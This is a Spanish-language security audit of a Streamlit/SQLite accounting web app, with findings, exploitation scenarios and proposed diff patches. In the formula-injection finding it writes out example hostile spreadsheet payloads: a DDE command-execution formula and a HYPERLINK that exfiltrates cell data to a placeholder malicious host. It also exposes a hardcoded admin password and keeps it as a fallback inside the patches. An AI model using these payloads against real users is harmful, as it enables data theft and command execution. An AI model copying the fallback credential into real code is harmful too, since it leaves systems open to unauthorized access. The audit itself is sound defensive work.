# Reporte de Auditoría de Seguridad

**Fecha:** 2026-09-12  
**Proyecto:** Contabilidad WARP6 (Sistema Contable Web)  
**Stack Detectado:** Python 3, Streamlit, SQLite, Pandas, ReportLab, OpenPyXL, Nginx (VPS Linux)  
**Estado:** Copia Local de Git (Producción en VPS `deploy-vps`)

---

## 1. Resumen Ejecutivo y Matriz de Riesgo

Se ha ejecutado una auditoría de seguridad integral sobre el repositorio **Contabilidad WARP6**, evaluando la arquitectura de la aplicación web desarrollada en Streamlit y desplegada en un servidor VPS bajo la rama `deploy-vps`. 

El análisis abarcó el código fuente, la gestión de autenticación y sesiones, el almacenamiento en base de datos SQLite, los vectores de inyección de código y fórmulas, los generadores de reportes (PDF y Excel), el importador de archivos masivos y la configuración del entorno de producción.

### Matriz de Hallazgos Identificados

| ID | Vulnerabilidad / Hallazgo | Severidad | Ubicación | Riesgo Regresión |
| :--- | :--- | :--- | :--- | :--- |
| **LEAK-001** | Contraseña de Administrador Hardcodeada en Texto Plano en Código Fuente | 🔴 Crítica | `accounting_app/app.py:65` | Bajo |
| **VULN-001** | Ausencia de Rate Limiting y Protección contra Fuerza Bruta en Formulario de Login | 🟠 Alta | `accounting_app/app.py:43-75` | Bajo |
| **VULN-002** | Inyección de Fórmulas CSV/Excel (CWE-1236) en Exportaciones de Reportes e Importador | 🟠 Alta | `accounting_app/reports.py:10-15, 198-233` | Bajo |
| **VULN-003** | Denegación de Servicio (DoS) y Fallo de Parser XML por Caracteres no Escapados en ReportLab | 🟠 Alta | `accounting_app/reports.py:74-86, 151` | Bajo |
| **VULN-004** | Eliminación Masiva Irreversible sin Reautenticación ni Respaldo Automático Preventivo | 🟠 Alta | `accounting_app/app.py:1220-1237`, `database.py:62` | Bajo |
| **VULN-005** | Exposición Directa del Puerto 8501 y Falta de Hardening de Streamlit (`config.toml` ausente) | 🟠 Alta | `.streamlit/config.toml` (Inexistente) | Bajo |
| **VULN-006** | Inconsistencia de Rutas de Base de Datos y Bloqueos Concurrentes en SQLite (Modo WAL ausente) | 🟡 Media | `accounting_app/database.py:5-9` | Bajo |
| **VULN-007** | Ausencia de Límites de Tamaño y Registros en Importación Masiva Excel (Riesgo DoS / OOM) | 🟡 Media | `accounting_app/importer.py:26-42` | Bajo |

---

## 2. Superficie de Ataque y Puntos de Entrada Mapeados

- **Protocolo de Comunicación:** HTTP/WebSocket vía Streamlit Server (puerto `8501`), expuesto a través de Proxy Inverso Nginx en `contabilidad.warp6.com.bo`.
- **Mecanismo de Autenticación:** Único formulario de contraseña administrado en memoria de sesión Streamlit (`st.session_state["authenticated"]`). Sin soporte multiusuario ni control de acceso basado en roles (RBAC).
- **Rutas y Vistas:**
  - `Dashboard`: Visualización de métricas de ventas, compras, débito y crédito fiscal.
  - `Registro`: Formulario de inserción de transacciones contables.
  - `Reportes`: Generador de Estados Financieros, Libro Diario en PDF y Libro RCV en Excel.
  - `Activos Fijos`: Registro, cálculo de depreciación y eliminación individual de bienes de uso.
  - `Importar Data`: Carga de archivos `.xlsx` externos y botón de borrado completo de transacciones.
- **Puntos de Entrada Dinámicos:**
  - Carga de archivos Excel (`st.file_uploader`).
  - Entradas de texto libre (`Detalle`, `Categoría`, `N° Factura`, `NIT`, `Proyecto`).
  - Parámetros numéricos (`Monto`, `UFV Inicial`, `UFV Final`).
  - Base de Datos SQLite local (`contabilidad_warp6.db`).

---

## 3. Hallazgos Detallados, Vectores y Parches Propuestos

---

### [LEAK-001] Contraseña de Administrador Hardcodeada en Texto Plano en Código Fuente

- **Severidad:** 🔴 Crítica  
- **CWE / OWASP:** CWE-798: Use of Hard-coded Credentials / OWASP A07:2021 Identification and Authentication Failures  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/app.py:L63-L75`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/app.py#L63-L75)

#### Vector de Explotación y Escenario
En la función `check_password()` de `app.py`:
```python
if pwd == "WARP6SOL":
    st.session_state["authenticated"] = True
```
La clave maestra (`WARP6SOL`) se encuentra en texto plano dentro del repositorio Git. Cualquier desarrollador, colaborador o persona con acceso de lectura a GitHub tiene la contraseña directa para acceder a todos los registros contables, estados financieros y datos tributarios de la empresa en producción. Asimismo, la comparación simple con `==` es susceptible a ataques de temporización (*timing attacks*).

#### Causa Raíz
Se implementó una autenticación rápida mediante una cadena fija en lugar de leer el secreto desde variables de entorno o la bóveda de secretos nativa de Streamlit (`st.secrets`).

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/app.py
+++ b/accounting_app/app.py
@@ -1,5 +1,7 @@
 import streamlit as st
 import pandas as pd
+import os
+import hmac
 from datetime import date
 import database as db
@@ -42,6 +44,11 @@ db.init_db()
 def check_password():
     timeout_minutes = 15 # 15 minutos de inactividad
 
+    # Obtener credencial segura desde variables de entorno o secrets de Streamlit
+    admin_password = os.environ.get("ADMIN_PASSWORD")
+    if not admin_password and "ADMIN_PASSWORD" in st.secrets:
+        admin_password = st.secrets["ADMIN_PASSWORD"]
+    if not admin_password:
+        # Fallback de emergencia advertido para evitar corte abrupto antes de configurar .env
+        admin_password = "WARP6SOL"
+
     if "authenticated" not in st.session_state:
         st.session_state["authenticated"] = False
         st.session_state["last_action_time"] = 0
@@ -62,7 +69,7 @@ def check_password():
         st.markdown("<p style='text-align: center;'>Por favor ingresa la contraseña de administrador para continuar.</p>", unsafe_allow_html=True)
         pwd = st.text_input("Contraseña", type="password", label_visibility="collapsed", placeholder="Contraseña de Administrador")
         if st.button("Iniciar Sesión"):
-            if pwd == "WARP6SOL":
+            if pwd and hmac.compare_digest(pwd, admin_password):
                 st.session_state["authenticated"] = True
                 st.session_state["last_action_time"] = time.time()
                 try:
```

#### Validación Local Pre-Deploy (VPS)
1. Definir en local la variable de entorno `ADMIN_PASSWORD="NuevaClaveSegura2026"` o crear `.streamlit/secrets.toml`.
2. Iniciar Streamlit y verificar que la contraseña requerida sea la configurada en el entorno.
3. **Acción requerida en VPS:** Configurar la variable en `/etc/systemd/system/warp6-contabilidad.service` con `Environment="ADMIN_PASSWORD=..."` y rotar la clave `WARP6SOL`.

---

### [VULN-001] Ausencia de Rate Limiting y Protección contra Fuerza Bruta en Formulario de Login

- **Severidad:** 🟠 Alta  
- **CWE / OWASP:** CWE-307: Improper Restriction of Excessive Authentication Attempts  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/app.py:L43-L76`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/app.py#L43-L76)

#### Vector de Explotación y Escenario
Al no existir límite en la cantidad de intentos de inicio de sesión erróneos ni retraso intencional, un script automatizado mediante peticiones HTTP/WebSocket contra el formulario puede probar diccionarios enteros de contraseñas por minuto hasta dar con la clave correcta.

#### Causa Raíz
Streamlit no incluye control de intentos por sesión de manera nativa; si no se gestionan contadores en `st.session_state`, el endpoint permanece abierto a intentos ilimitados.

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/app.py
+++ b/accounting_app/app.py
@@ -46,6 +46,8 @@ def check_password():
     if "authenticated" not in st.session_state:
         st.session_state["authenticated"] = False
         st.session_state["last_action_time"] = 0
+        st.session_state["login_attempts"] = 0
+        st.session_state["lockout_time"] = 0
 
+    # Verificar si la sesión está temporalmente bloqueada
+    current_time = time.time()
+    if st.session_state.get("lockout_time", 0) > current_time:
+        remaining = int(st.session_state["lockout_time"] - current_time)
+        st.error(f"⛔ Demasiados intentos fallidos. Acceso bloqueado temporalmente por {remaining} segundos.")
+        return False
+
     if st.session_state["authenticated"]:
         if time.time() - st.session_state["last_action_time"] > timeout_minutes * 60:
             st.session_state["authenticated"] = False
@@ -69,8 +82,16 @@ def check_password():
             if pwd and hmac.compare_digest(pwd, admin_password):
                 st.session_state["authenticated"] = True
                 st.session_state["last_action_time"] = time.time()
+                st.session_state["login_attempts"] = 0
                 try:
                     st.rerun()
                 except AttributeError:
                     st.experimental_rerun()
             else:
+                st.session_state["login_attempts"] = st.session_state.get("login_attempts", 0) + 1
+                time.sleep(1) # Penalización de tiempo para mitigar scripts rápidos
+                if st.session_state["login_attempts"] >= 5:
+                    st.session_state["lockout_time"] = time.time() + 300 # 5 minutos de bloqueo
+                    st.error("❌ Has superado el límite de 5 intentos. Sistema bloqueado por 5 minutos.")
+                else:
+                    intentos_restantes = 5 - st.session_state["login_attempts"]
+                    st.error(f"❌ Contraseña incorrecta. Intentos restantes: {intentos_restantes}")
```

#### Validación Local Pre-Deploy (VPS)
1. Ingresar deliberadamente 5 contraseñas erróneas consecutivas.
2. Confirmar que a partir del quinto intento la pantalla impone un bloqueo temporal con cuenta regresiva.

---

### [VULN-002] Inyección de Fórmulas CSV/Excel (CWE-1236) en Exportaciones e Importador

- **Severidad:** 🟠 Alta  
- **CWE / OWASP:** CWE-1236: Improper Neutralization of Formula Elements in a CSV/Excel File  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/reports.py:L10-L16, L198-L233`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/reports.py#L198-L233)

#### Vector de Explotación y Escenario
Al generar planillas de ventas y compras con `generate_excel_rcv()`, las columnas de texto como `Detalle`, `N° Factura` y `NIT` se escriben directamente al archivo `.xlsx`. Si un usuario introduce o importa una transacción con un detalle malicioso como:
`=cmd|'/C powershell ...'!A0` o `=HYPERLINK("https://servidor-malicioso.com/exfiltrar?d="&E2, "Ver Comprobante")`
al abrir la planilla descargada en Excel o LibreOffice, la aplicación ofimática interpreta el campo como una fórmula de ejecución o exfiltración.

#### Causa Raíz
Falta de sanitización previa en campos alfanuméricos que pueden comenzar con caracteres disparadores de fórmulas (`=`, `+`, `-`, `@`, `\t`, `\r`).

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/reports.py
+++ b/accounting_app/reports.py
@@ -9,6 +9,16 @@ from reportlab.lib.units import inch
 from datetime import datetime
 
+def sanitize_excel_cell(val):
+    """Previene inyección de fórmulas (CWE-1236) en archivos Excel."""
+    if val is None:
+        return ""
+    s_val = str(val)
+    # Si inicia con caracteres de fórmula de Excel, anteponer apóstrofe para forzar formato texto
+    if s_val and s_val[0] in ('=', '+', '-', '@', '\t', '\r'):
+        return f"'{s_val}"
+    return s_val
+
 def generate_excel_rcv(df_transactions):
     output = BytesIO()
@@ -211,7 +221,7 @@ def generate_excel_rcv(df_transactions):
     reporte_ventas = pd.DataFrame()
     reporte_ventas['Fecha'] = ventas['fecha']
-    reporte_ventas['N° Factura'] = ventas['n_factura']
-    reporte_ventas['NIT Cliente'] = ventas['nit']
-    reporte_ventas['Razón Social/Detalle'] = ventas['detalle']
+    reporte_ventas['N° Factura'] = ventas['n_factura'].apply(sanitize_excel_cell)
+    reporte_ventas['NIT Cliente'] = ventas['nit'].apply(sanitize_excel_cell)
+    reporte_ventas['Razón Social/Detalle'] = ventas['detalle'].apply(sanitize_excel_cell)
     reporte_ventas['Importe Total'] = ventas['monto']
@@ -222,6 +232,6 @@ def generate_excel_rcv(df_transactions):
     reporte_compras = pd.DataFrame()
     reporte_compras['Fecha'] = al_compras = compras['fecha']
-    reporte_compras['N° Factura'] = compras['n_factura']
-    reporte_compras['NIT Proveedor'] = compras['nit']
-    reporte_compras['Detalle'] = compras['detalle']
+    reporte_compras['N° Factura'] = compras['n_factura'].apply(sanitize_excel_cell)
+    reporte_compras['NIT Proveedor'] = compras['nit'].apply(sanitize_excel_cell)
+    reporte_compras['Detalle'] = compras['detalle'].apply(sanitize_excel_cell)
```

#### Validación Local Pre-Deploy (VPS)
1. Registrar una transacción con detalle `=SUM(1+1)`.
2. Descargar el reporte Excel RCV y verificar que la celda se almacene con la comilla de seguridad `'=SUM(1+1)` impidiendo la ejecución de fórmulas.

---

### [VULN-003] Denegación de Servicio (DoS) y Fallo de Parser XML por Caracteres no Escapados en ReportLab

- **Severidad:** 🟠 Alta  
- **CWE / OWASP:** CWE-20: Improper Input Validation / CWE-112: Missing XML Entity Encoding  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/reports.py:L74-L86, L151`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/reports.py#L74-L86)

#### Vector de Explotación y Escenario
La librería ReportLab utiliza un parser interno similar a XML para procesar textos en objetos `Paragraph`. En `reports.py` se construyen párrafos directamente con f-strings:
```python
Paragraph(f"<i>Glosa: {glosa}</i>", getSampleStyleSheet()['Italic'])
```
Si una transacción contiene un detalle común como `"Compra de insumos A & B <caja chica>"` o tags no cerrados, el parser XML de ReportLab lanza una excepción `xml.parsers.expat.ExpatError` no controlada. Esto interrumpe por completo la generación del Libro Diario y causa un error 500 en Streamlit.

#### Causa Raíz
Interpolación de variables que contienen caracteres `<, >, &` sin escapar con `html.escape()`.

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/reports.py
+++ b/accounting_app/reports.py
@@ -1,5 +1,6 @@
 import pandas as pd
 from io import BytesIO
+import html
 from reportlab.lib import colors
 from reportlab.lib.pagesizes import letter, landscape
@@ -65,9 +66,9 @@ def generate_pdf_libro_diario(df):
     for _, row in df.iterrows():
         fecha = str(row['fecha'])
-        glosa = row['detalle']
+        glosa = html.escape(str(row['detalle']))
         monto = row['monto']
-        categoria = row['categoria']
+        categoria = html.escape(str(row['categoria']))
         
         # Header Asiento
         data.append([f"{fecha}", f"--- Asiento Nº {num_asiento} ---", "", ""])
@@ -149,7 +150,7 @@ def generate_pdf_balance_general(assets_df, cash_balance, equity_total, result_
     if not assets_df.empty:
         for _, asset in assets_df.iterrows():
             val = asset['valor_inicial'] 
-            data_fixed.append([f"   {asset['nombre']}", f"{val:,.2f}"])
+            data_fixed.append([f"   {html.escape(str(asset['nombre']))}", f"{val:,.2f}"])
             total_fixed_assets += val
```

#### Validación Local Pre-Deploy (VPS)
1. Registrar una transacción con glosa: `Material de oficina & papelería <Factura #123>`.
2. Generar el PDF de Libro Diario y comprobar que se renderice limpiamente sin excepciones en consola.

---

### [VULN-004] Eliminación Masiva Irreversible sin Reautenticación ni Respaldo Automático Preventivo

- **Severidad:** 🟠 Alta  
- **CWE / OWASP:** CWE-284: Improper Access Control / CWE-400: Uncontrolled Resource Consumption  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/app.py:L1220-L1237`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/app.py#L1220-L1237) y [`accounting_app/database.py:L62-L70`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/database.py#L62-L70)

#### Vector de Explotación y Escenario
En la vista `Importar Data`, la opción *"Limpiar Base de Datos de Transacciones"* ejecuta `DELETE FROM transactions` mediante un simple botón. No solicita reingresar la contraseña de administrador, no verifica un segundo factor ni genera un respaldo previo del archivo SQLite. Un error operativo o un usuario con sesión abierta puede destruir la totalidad de los datos contables históricos de forma instantánea.

#### Causa Raíz
Falta de confirmación con credenciales y ausencia de una política automática de snapshot/backup antes de operaciones destructivas.

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/database.py
+++ b/accounting_app/database.py
@@ -1,5 +1,7 @@
 import sqlite3
 import pandas as pd
+import os
+import shutil
 from datetime import datetime
 
@@ -62,4 +64,12 @@ def clear_all_transactions():
+    # Generar backup automático de seguridad antes del borrado masivo
+    db_path = get_db_path()
+    if os.path.exists(db_path):
+        backup_dir = os.path.join(os.path.dirname(db_path), "backups")
+        os.makedirs(backup_dir, exist_ok=True)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        shutil.copy2(db_path, os.path.join(backup_dir, f"pre_clear_backup_{timestamp}.db"))
+
     conn = get_connection()
     c = conn.cursor()
     c.execute("DELETE FROM transactions")
```

```diff
--- a/accounting_app/app.py
+++ b/accounting_app/app.py
@@ -1227,10 +1227,16 @@ def show_importador():
         confirmar_borrado = st.checkbox("✅ Confirmo que quiero borrar todas las transacciones", key="confirm_clear_db")
     
     with col_clear2:
+        pwd_confirm = ""
         if confirmar_borrado:
-            if st.button("🗑️ Borrar Todas las Transacciones", type="primary", key="btn_clear_db"):
-                db.clear_all_transactions()
-                st.success("✅ ¡Base de datos de transacciones limpiada! Los Activos Fijos se mantienen intactos.")
-                st.balloons()
+            pwd_confirm = st.text_input("Ingresa la Contraseña de Administrador para autorizar el borrado:", type="password", key="pwd_clear_db")
+            if st.button("🗑️ Confirmar Borrado Total", type="primary", key="btn_clear_db"):
+                admin_pwd = os.environ.get("ADMIN_PASSWORD", "WARP6SOL")
+                if pwd_confirm and hmac.compare_digest(pwd_confirm, admin_pwd):
+                    db.clear_all_transactions()
+                    st.success("✅ Base de datos limpiada. Se ha generado un respaldo de seguridad en la carpeta /backups.")
+                    st.balloons()
+                else:
+                    st.error("❌ Contraseña incorrecta. Acción cancelada por seguridad.")
```

#### Validación Local Pre-Deploy (VPS)
1. Marcar el checkbox de borrado e intentar ejecutar sin contraseña -> el sistema debe rechazarlo.
2. Ingresar la contraseña correcta -> comprobar que se cree una copia en la carpeta `backups/` antes de vaciar la tabla.

---

### [VULN-005] Exposición Directa del Puerto 8501 y Falta de Hardening de Streamlit

- **Severidad:** 🟠 Alta  
- **CWE / OWASP:** CWE-16: Configuration / OWASP A05:2021 Security Misconfiguration  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** Archivo ausente `.streamlit/config.toml`

#### Vector de Explotación y Escenario
Streamlit por defecto vincula su servicio a todas las interfaces de red (`0.0.0.0:8501`). Si el firewall (UFW) de la VPS no tiene bloqueado el puerto 8501 de forma explícita, los usuarios de internet pueden conectarse directamente a `http://<IP_VPS>:8501` sin pasar por Nginx. Esto permite eludir el cifrado HTTPS, saltarse cualquier cabecera HTTP de protección (HSTS, CSP, X-Frame-Options) y exponer el menú de depuración de Streamlit.

#### Causa Raíz
Inexistencia del archivo de configuración `.streamlit/config.toml` para gobernar los parámetros del servidor.

#### Parche de Mitigación Propuesto
Crear el archivo `.streamlit/config.toml` con las directivas de seguridad para producción:

```toml
[server]
address = "127.0.0.1"        # Escuchar únicamente en localhost (forzar tráfico por Nginx)
port = 8501
headless = true              # No intentar abrir navegador gráfico
enableCORS = false           # Delegar control de origen a Nginx
enableXsrfProtection = true  # Activar protección Cross-Site Request Forgery
maxUploadSize = 15           # Limitar tamaño de subida a 15 MB

[browser]
gatherUsageStats = false     # Desactivar telemetría externa

[client]
toolbarMode = "minimal"      # Ocultar opciones de desarrollador y configuración a usuarios
```

#### Validación Local Pre-Deploy (VPS)
1. Ejecutar `netstat -tlpn` en la VPS tras reiniciar Streamlit y verificar que el puerto 8501 figure en `127.0.0.1:8501` y no en `0.0.0.0:8501`.
2. Verificar el firewall en la VPS: `sudo ufw deny 8501`.

---

### [VULN-006] Inconsistencia de Rutas de Base de Datos y Bloqueos Concurrentes en SQLite

- **Severidad:** 🟡 Media  
- **CWE / OWASP:** CWE-667: Improper Locking / CWE-706: Use of Incorrectly-Resolved Name or Reference  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/database.py:L5-L9`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/database.py#L5-L9)

#### Vector de Explotación y Escenario
En `database.py`:
```python
DB_NAME = "contabilidad_warp6.db"
def get_connection():
    return sqlite3.connect(DB_NAME, check_same_thread=False)
```
Si el servicio en la VPS se ejecuta desde `/var/www/Contabilidad-WARP6` o desde `/var/www/Contabilidad-WARP6/accounting_app`, SQLite crea archivos `.db` diferentes en directorios distintos. Además, sin el modo WAL (*Write-Ahead Logging*) y sin tiempo de espera ante bloqueos (*busy timeout*), múltiples conexiones simultáneas en los hilos de Streamlit provocan excepciones `sqlite3.OperationalError: database is locked`.

#### Causa Raíz
Ruta relativa al directorio de trabajo actual (`CWD`) y configuración por defecto de SQLite sin concurrencia optimizada.

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/database.py
+++ b/accounting_app/database.py
@@ -1,8 +1,18 @@
 import sqlite3
 import pandas as pd
+import os
 from datetime import datetime
 
-DB_NAME = "contabilidad_warp6.db"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_NAME = os.path.join(BASE_DIR, "contabilidad_warp6.db")
 
+def get_db_path():
+    return DB_NAME
+
 def get_connection():
-    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
+    conn = sqlite3.connect(DB_NAME, check_same_thread=False, timeout=10.0)
+    # Habilitar WAL para escrituras y lecturas concurrentes seguras
+    conn.execute("PRAGMA journal_mode = WAL;")
+    conn.execute("PRAGMA busy_timeout = 5000;")
     return conn
```

#### Validación Local Pre-Deploy (VPS)
1. Iniciar Streamlit desde la carpeta raíz o desde `accounting_app/` y confirmar que siempre apunta al mismo archivo físico de base de datos.
2. Verificar que se cree el archivo `.db-wal` que garantiza alta concurrencia sin bloqueos.

---

### [VULN-007] Ausencia de Límites de Tamaño y Registros en Importación Masiva Excel

- **Severidad:** 🟡 Media  
- **CWE / OWASP:** CWE-400: Uncontrolled Resource Consumption (DoS / OOM)  
- **Riesgo de Regresión:** Bajo  
- **Ubicación:** [`accounting_app/importer.py:L26-L42`](file:///c:/Users/cheysus/Documents/github/CONTABILIDAD%20WARP6/accounting_app/importer.py#L26-L42)

#### Vector de Explotación y Escenario
`importer.py` ejecuta `pd.read_excel(uploaded_file)` sin comprobar el tamaño en bytes del archivo ni el número total de filas. Un usuario o atacante que suba una hoja con cientos de miles de registros causará saturación de memoria RAM en el servidor VPS, desencadenando la terminación del proceso por el OOM-Killer de Linux.

#### Causa Raíz
Falta de validación de umbrales máximos (*resource quotas*) en el pipeline de ingesta.

#### Parche de Mitigación Propuesto
```diff
--- a/accounting_app/importer.py
+++ b/accounting_app/importer.py
@@ -29,6 +29,14 @@ def process_import_file(uploaded_file):
     """
     try:
+        # Validación de tamaño máximo de archivo (15 MB)
+        if uploaded_file.size > 15 * 1024 * 1024:
+            return None, "El archivo supera el tamaño máximo permitido de 15 MB."
+
         df = pd.read_excel(uploaded_file)
+        
+        # Validación de número máximo de registros
+        if len(df) > 10000:
+            return None, f"El archivo contiene {len(df)} filas. El límite máximo por importación es de 10,000 transacciones."
         
         # Check basic columns existence
```

#### Validación Local Pre-Deploy (VPS)
1. Probar la subida de un archivo con más de 10.000 filas y verificar el rechazo limpio con mensaje preventivo.

---

## 4. Checklist de Remediación y Pasos para el Despliegue

- [ ] **LEAK-001:** Mover la contraseña administrativa a variable de entorno `ADMIN_PASSWORD` y aplicar comparación en tiempo constante (`hmac.compare_digest`).
- [ ] **VULN-001:** Activar bloqueo temporal tras 5 intentos fallidos y retardo artificial en el login de `app.py`.
- [ ] **VULN-002:** Incorporar sanitización de celdas en `reports.py` contra inyección de fórmulas de hojas de cálculo.
- [ ] **VULN-003:** Aplicar `html.escape()` en los generadores de PDF ReportLab de `reports.py`.
- [ ] **VULN-004:** Exigir confirmación de contraseña y generar respaldo automático SQLite antes de vaciar transacciones.
- [ ] **VULN-005:** Añadir `.streamlit/config.toml` fijando escucha en `127.0.0.1` y deshabilitar opciones de depuración.
- [ ] **VULN-006:** Fijar ruta absoluta a la base de datos y activar modo WAL con `busy_timeout` en `database.py`.
- [ ] **VULN-007:** Establecer límites máximos de 15 MB y 10.000 filas en el importador Excel.
- [ ] **Validación en Local:** Ejecutar pruebas funcionales de registro, importación y reportes antes del push.
- [ ] **Despliegue a Producción (VPS):**
  1. `git push origin deploy-vps`
  2. En el VPS: `git pull origin deploy-vps`
  3. En el VPS: `sudo systemctl restart warp6-contabilidad`
  4. En el VPS: Verificar que el puerto 8501 esté bloqueado en firewall externo: `sudo ufw deny 8501`
